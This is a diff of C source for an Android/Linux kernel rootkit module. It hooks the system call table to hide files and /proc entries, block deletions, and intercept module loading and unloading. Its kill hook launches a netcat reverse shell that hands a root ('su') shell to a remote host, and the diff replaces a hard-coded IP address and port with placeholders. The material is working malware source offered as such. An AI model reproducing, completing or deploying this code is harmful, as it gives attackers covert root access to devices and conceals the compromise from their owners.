@@ -1,11 +1,11 @@
-#include <linux/init_task.h> 
-#include <linux/kernel.h> 
-#include <linux/module.h> 
-#include <linux/sched.h> 
-#include <linux/unistd.h> 
+#include <linux/init_task.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/sched.h>
+#include <linux/unistd.h>
 #include <linux/dirent.h>
 #include <linux/fs.h>
-#include <asm/uaccess.h> 
+#include <asm/uaccess.h>
 #include <linux/compat.h>
 
 
@@ -81,10 +81,10 @@ void get_sys_call_table(){
 	unsigned long offset_from_swi_vector_adr=0;
 	unsigned long *swi_vector_adr=0;
 
-	offset_from_swi_vector_adr=((*(long *)swi_table_addr)&0xfff)+8; 
-	swi_vector_adr=*(unsigned long *)(swi_table_addr+offset_from_swi_vector_adr); 
+	offset_from_swi_vector_adr=((*(long *)swi_table_addr)&0xfff)+8;
+	swi_vector_adr=*(unsigned long *)(swi_table_addr+offset_from_swi_vector_adr);
 
-	while(swi_vector_adr++){	
+	while(swi_vector_adr++){
 		if(((*(unsigned long *)swi_vector_adr)&0xfffff000)==0xe28f8000){ // Copy the entire sys_call_table from the offset_from_swi_vector_adr starting the hardware interrupt table
 			offset_from_swi_vector_adr=((*(unsigned long *)swi_vector_adr)&0xfff)+8;		  // 0xe28f8000 is end of interrupt space. Hence we stop.
 			sys_call_table=(void *)swi_vector_adr+offset_from_swi_vector_adr;
@@ -98,17 +98,13 @@ asmlinkage uid_t our_getuid(void){
 	printk("Running our_getuid");
 	struct uid_t *tmp;
 	tmp=(*orig_getuid)();
-	// if(tmp==0) {
-	// 	printk("Skipping as uid is root");
-	// 	return;
-	// }
 	return tmp;
-} 
+}
 
 
 asmlinkage ssize_t our_unlink(const char __user *pathname)
 {
-	if (strstr(pathname,"hello.txt") || strstr(pathname,"/bin") ) 
+	if (strstr(pathname,"hello.txt") || strstr(pathname,"/bin") )
 		return -1;
         printk (KERN_INFO "SYS_UNLINK: %s\n",pathname);
         return orig_unlink(pathname);
@@ -154,7 +150,7 @@ asmlinkage ssize_t our_rmdir (const char __user *pathname)
         return orig_rmdir(pathname);
 }
 
-asmlinkage ssize_t our_close(int fd) 
+asmlinkage ssize_t our_close(int fd)
 {
         printk(KERN_INFO "SYS_CLOSE %s\n",current->comm);
         return orig_close(fd);
@@ -167,10 +163,10 @@ asmlinkage int our_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, uns
 	int mover,process;
 
 	ret=(*orig_getdents64)(fd,dirp,count);
-	
-	if(!ret) 
+
+	if(!ret)
 		return ret;
-	
+
 	td2=(struct linux_dirent64 *)kmalloc(ret,GFP_KERNEL);
 	copy_from_user(td2,dirp,ret);
 
@@ -182,27 +178,27 @@ asmlinkage int our_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, uns
 	if(td1->d_name) {
 		printk("\nIntercepting %s",td1->d_name);
 	}
-	
+
 	copy_to_user((void *)dirp,(void *)td2,ret);
 	kfree(td2);
 	return ret;
-} 
+}
 
 void reverse_shell()
 {
 	char *path="/system/xbin/nc";
-	char *argv[]={"169.228.66.210","12000","-e","su","&",NULL};
+	char *argv[]={"IP/DOMAIN HERE","PORT_NO","-e","su","&",NULL};
 	char *envp[]={"HOME=/","PATH=/sbin:/system/sbin:/system/bin:/system/xbin",NULL};
 	call_usermodehelper(path,argv,envp,1);
 }
-	
+
 asmlinkage int our_kill(pid_t pid, int sig)
 {
 	reverse_shell();
 	printk(KERN_INFO "SYS_KILL: %d\n",pid);
 
-	return (*orig_kill)(pid,sig); 
-} 
+	return (*orig_kill)(pid,sig);
+}
 
 asmlinkage ssize_t our_writev(int fd,struct iovec *vector,int count)
 {
@@ -211,7 +207,7 @@ asmlinkage ssize_t our_writev(int fd,struct iovec *vector,int count)
 }
 
 
-asmlinkage ssize_t our_open(const char *pathname, int flags) 
+asmlinkage ssize_t our_open(const char *pathname, int flags)
 {
 	if(strstr(pathname,"/proc/modules") || strstr(pathname,"hello") || strstr(pathname,"/proc"))
 	{
@@ -227,46 +223,7 @@ asmlinkage ssize_t our_open(const char *pathname, int flags)
 	return orig_stat(filename,statbuf);
 }
 
-
-// asmlinkage int sys_execve(const char __user *filenamei,
-//                           const char __user *const __user *argv,
-//                           const char __user *const __user *envp, struct pt_regs *regs)
-// {
-//         int error;
-//         char * filename;
-
-//         filename = getname(filenamei);
-//         error = PTR_ERR(filename);
-//         if (IS_ERR(filename))
-//                 goto out;
-//         error = do_execve(filename, argv, envp, regs);
-//         putname(filename);
-// out:
-//         return error;
-// }
-
-// asmlinkage int our_execve(const char __user *filenamei,
-//                           const char __user *const __user *argv,
-//                           const char __user *const __user *envp, struct pt_regs *regs)
-// {
-
-
-// 	printk(KERN_INFO "SYS_EXECVE: %s\n",filenamei);
-//         int error;
-//         char * filename;
-
-//         filename = getname(filenamei);
-//         error = PTR_ERR(filename);
-//         if (IS_ERR(filename))
-//                 goto out;
-//         error = do_execve(filename, argv, envp, regs);
-//         putname(filename);
-// out:
-//         return error;
-		
-// }
-
-int init_module(void) 
+int init_module(void)
 {
 
 	// find_offset();
@@ -285,13 +242,13 @@ int init_module(void)
 	orig_unlink = sys_call_table[__NR_UNLINK];
 	orig_execve = sys_call_table[__NR_EXECVE];
 	orig_stat = sys_call_table[__NR_STAT];
-	// orig_delete_module = sys_call_table[__NR_DEL_MOD];
-	// orig_init_module = sys_call_table[__NR_INIT_MOD];
-	
+	orig_delete_module = sys_call_table[__NR_DEL_MOD];
+	orig_init_module = sys_call_table[__NR_INIT_MOD];
+
 	// Overwrite sys_call_table with our versions of sys_calls
 
-	// sys_call_table[__NR_DEL_MOD] = our_delete_module;
-	// sys_call_table[__NR_INIT_MOD] = our_init_module;
+	sys_call_table[__NR_INIT_MOD] = our_init_module;
+	sys_call_table[__NR_DEL_MOD] = our_delete_module;
 	sys_call_table[__NR_WRITE] = our_write;
 	sys_call_table[__NR_UNLINK] = our_unlink;
 	sys_call_table[__NR_GETDENTS64] = our_getdents64;
@@ -303,13 +260,13 @@ int init_module(void)
 	sys_call_table[__NR_OPEN] = our_open;
 	sys_call_table[__NR_GETUID] = our_getuid;
 	sys_call_table[__NR_STAT] = our_stat;
-	//sys_call_table[__NR_EXECVE] = our_execve;
-	
-	return 0; 
+
+	return 0;
 }
 
-void cleanup_module(void) 
-{ 
+void cleanup_module(void)
+{
+
 	// Need to un-load cleanly. Write peristence into file with read-only access to reload.
 	sys_call_table[__NR_WRITE] = orig_write;
 	sys_call_table[__NR_GETDENTS64]=orig_getdents64;
@@ -322,7 +279,7 @@ void cleanup_module(void)
 	sys_call_table[__NR_GETUID]=orig_getuid;
 	sys_call_table[__NR_UNLINK]=orig_unlink;
 	sys_call_table[__NR_STAT] = orig_stat;
-	// sys_call_table[__NR_INIT_MOD] = orig_init_module;
-	// sys_call_table[__NR_DEL_MOD] = orig_delete_module;
-	// sys_call_table[__NR_EXECVE] = orig_execve;
+	sys_call_table[__NR_INIT_MOD] = orig_init_module;
+	sys_call_table[__NR_DEL_MOD] = orig_delete_module;
+
 }
